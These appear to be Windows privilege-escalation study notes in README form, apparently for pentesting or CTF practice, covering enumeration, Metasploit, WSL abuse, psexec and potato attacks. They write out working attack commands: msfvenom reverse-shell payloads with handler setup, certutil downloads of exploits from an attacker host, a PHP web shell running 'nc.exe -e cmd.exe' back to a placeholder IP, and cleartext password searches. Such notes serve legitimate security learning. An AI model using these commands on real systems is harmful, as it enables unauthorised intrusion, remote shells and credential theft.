# Windows-Privesc

# Terms:
```
IIS - Internet Information Services, is an extensible web server software created by Microsoft for use with the Windows NT family. Its supports HTTP, HTTP/2, HTTPS, FTP, FTPS, SMTP and NNTP. 

DLL - Dynamic-link library is Microsoft's implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraris containing ActiveX controls), or DRV (for legacy system drivers). The file formats for DLLs are the same as for Windows EXE files - that is, Portable Executable (PE) for 32-bit and 64-bit Windows, and New Executable (NE) for 16-bit Windows. As with EXEs, DLLs can contain coded, data and resources, in any combination.

Meterpreter - Meterpreter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
Meterpeter is deployed using in-memory DLL injection. As a result, Meterpeter resides entirely in memory and writes nothing to disk.

Token Impersonation - Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file (like cookies for computers).
There are two types of tokens:
* Delegate - Created for logging into a machine or using Remote Desktop.
* Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.

Potato Attacks - In potato attacks we are tricking the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint we control.
We use the MIM (Man-in-the-middle) technique to attempt (NTLM relay) to locally negotiate a security token for the "NT AUTHORITY\SYSTEM" account. This is done through a series of windows API calls.
Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
```
# Basic commands:
```
whoami - command to see corrent user.
---
dir - command to list all files and directories that exist.
---
sysinfo - command to see system info.
---
shell - command to get shell.
---
findstr - command to grep specific thing that you want.
---
hostname - command to get hostname.
---
wmic qfe - command to extract patching.
---
wmic logicaldisk - to get the list of drives.
---
net user - command to get the users that exist.
---
net localgroup - command to get the localgroups that exit on the system.
---
netstat - command to get the ports.
---
sc - command to use service control.
---
certutil - command like wget.
---
cd /users/administrator - command to get to administrator directory.
---
where /R (recursive) c:\windows - command that we can use to find a file on disk c in the windows directory.
---
```
## Reverse shell using FTP/SMB and meterpreter
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
---
After we see that we get a shell we can go to msfconsole and write use exploite/multi/handler.
When we are in the exploit we need to set the payload with the next command ---> set payload windows/meterpeter/reverse_tcp (the payload is the same as we used earlier.
After we can write options and see that the payload is set and we can see that there is a LHOST LPORT that we need to set the same as we did in the payload.
Payload for LHOST ---> set lhost $IP
Payload for LPORT ---> set lport $port
After we've set all the things that we need we can use the command run.

Then we need to go the the ftp server and upload our file and execute it.
```
# System Enumeration
```
First lets use the command systeminfo.
---
For example we can use systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" to get specific things that we want.
---
We can see how many drives are the in the system by using the command wmic logicaldisk.
```
# User Enumeration
```
First we want to see what user we got so lets use the command ---> whoami.

To see what privileges we got we can use the command ---> whoami /priv.

To see what groups we are involved in we can use the command ---> whoami /groups.

To see what users are on the machine we can use the command ---> net user (to get information about the users that we see we can add the user name to the command).

To see what localgroup exists we can use the command ---> net localgroup (we can add administrator to the command to see what users are in the administrator group or we can add any existing group to enumerate our way to users in a specific group).

```
# Network Enumeration
```
First lets use the command ---> ipconfig to get the basic information about the network ( we can add /all to see more information).

We can look at a arp table with using the command arp -a.

We can look at the routing table with using the command ---> route print.

We can see the ports that are out there by using the command ---> netstat -ano
```
# Password Hunting in cleartext
```
We can use the command findstr /si password *.txt *.ini *.config
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *.config* 
```
#  AV and Firewall Enumeration
```
We can use the command ---> sc query windefend (to see information about windows defender).

To see all of the services that are running on the machine we can use the command ---> sc queryex type= service.

To see the firewalls that are up we can use the command ---> nets advfirewall firewall dump / netsh firewall show state / netsh firewall show config.
```
# Automated Tools
```
Executables
---
winPEAS.exe
Seatbelt.exe (need to compile)
Watson.exe (need to compile) (looks for common vulnerabilites)
SharpUp.exe (need to compile)
---
PowerShell
---
Sherlock.ps1 (looks for common vulnerabilites)
PowerUp.ps1
jaws-enum.ps1
---
Other
---
windows-exploit-suggester.py (local on attack machine)
Exploit suggester (Metasploit)
```
# Local_exploit_suggester
```
We can scan for kernel exploits with the next command on the meterpreter:
run post/multi/recon/local_exploit_suggester
---
After we can we find some exploits we can use the command ---> background.
After we used the command we need to run the exploit that we want to abuse with the next command ---> usr exploit/windows/local/****exploit****

Now we need to set out session to the seesion that we got from the background command with the command ---> set session ?.

We need to set out lhost and lport (we need to use a different port from which we used in the reverse shell).

Then we can use run
```
# Windows manual Escalation
```
First we need to see if we can upload a file to a ftp server or something like that...
Lets say that we can so we can use meterpreter with the next command:
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f (file extension) > (file name)
We need to upload the file to the place that it can be uploaded to.

Then we can run the command ---> nc -lvnp $PORT

We will get a connection without using meterpreter.

Now lets get systeminfo and lets find an exploit for the kernel version.

we found our kernel exploit lets find a writtable place and upload it to the windows shell with the next command:

certutil -urlcache -f http://X.X.X.X/file_name file_name(on the windows machine)
```
# Reverse shell using FTP/SMB and php
```
First we need to locate out nc.exe and upload it to the FTP/SMB server.
After we uploaded the nc.exe we need to create our reverse_shell.php file, we can use the next command:
---<?php system('nc.exe -e cmd.exe x.x.x.x $PORT')?>---
After we've uploaded the file we can execute it and get a reverse shell.
```
# Windows Subsystem for Linux (WSL)
```
First we need to look for a file named bash.exe/ wsl.exe.
We can use the command ---> where /R (recursive) c:\windows (any directory we think it my be in) bash.exe/ wsl.exe.
Now we need to execute the file that we've found.
[Another way we can abuse the wsl.exe/ bash.exe files is using commands with them for example:
1. wsl whoami
2. wsl python -c 'Python_Reverse_Shell']
When we've executed the file we will get a Linux shell.
Now we can use Linux basic enumeration techniques to try and find a way to get a higher privilege user (We can look at history, sudo -l, etc...).
Lets take a case when we found an administrator user and the password for that user now we can use psexec.py to connect to the machine.
The basic command is ---> python3 psexec.py HOSTNAME/username:'password'@$IP. (note: if psexec.py doesn't work we can use smbexec.py or wmiexe.py).
```
# Impersonation and Potato Attacks
```
When we get a shell on a machine we can use the command ---> whoami /priv and see our privileges information, we need to look for SeImpersonatePrivilege if we have it Enabled we can abuse it.
If we got a meterpreter shell we can use the command ---> getprivs and look for the SeImpersonatePrivilege.
We can get information about what all privileges are able to do in the next page ---> https://github.com/gtworek/Priv2Admin.
For information about potato attacks we can go to this site ---> https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.
```
